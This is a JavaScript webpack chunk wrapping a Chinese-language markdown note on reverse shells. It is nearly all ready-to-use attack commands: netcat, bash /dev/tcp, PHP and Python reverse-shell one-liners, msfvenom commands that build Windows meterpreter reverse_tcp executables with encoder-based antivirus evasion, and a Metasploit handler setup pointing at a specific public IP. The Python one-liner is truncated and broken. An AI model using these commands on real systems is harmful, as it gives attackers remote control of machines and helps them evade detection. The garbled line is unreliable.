(window.webpackJsonp=window.webpackJsonp||[]).push([[345],{973:function(n,e){n.exports='\x3c!--\ntitle: 08-反弹shell\nsort:\n--\x3e\n\n## 基本\n\n```bash\n# 正向shell的实现\nnc -lvp 23333 -e /bin/sh\t\t# 服务端\nnc 192.168.72.128 23333\t\t\t# 客户端\n\n# 反向shell\nnc -lvp 23333\t\t\t\t\t\t\t\t# 服务端\nnc -lvnp 23333\t\t\t\t\t\t\t# 阿里报错\n# 客户端\nnc <ip> <port> -e /bin/sh\nbash -i >& /dev/tcp/ip/23333 0>&1\n# php\nphp -r \'$f=fsockopen("ip",port);exec("/bin/sh -i <&3 >&3 2>&3");\'\n# python\npython -c \'import socket,subprocess,os; \\\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\ns.connect(("ip",port\nos.dup2(s.fileno(),0);\nos.dup2(s.fileno(),1);\nos.dup2(s.fileno(),2);\np=subprocess.call(["/bin/sh","-i"]);\'\n```\n\n## msf\n\n> [安装](https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers)\n\n```bash\n# 生成脚本程序\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.72.128 lport=4444 -f exe > shell.exe\n\n# 使用编码器免杀 msfvenom --list encoders\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=39.106.106.202 lport=7777 x86/shikata_ga_nai -x procdump.exe -i 20 -f exe > shell.exe\n\n# 服务端运行\nmsfconsole\nuse exploit/multi/handler\nset payload windows/meterpreter/reverse_tcp\nset lhost 39.106.106.202\nset lport 7777\nrun\n```\n'}}]);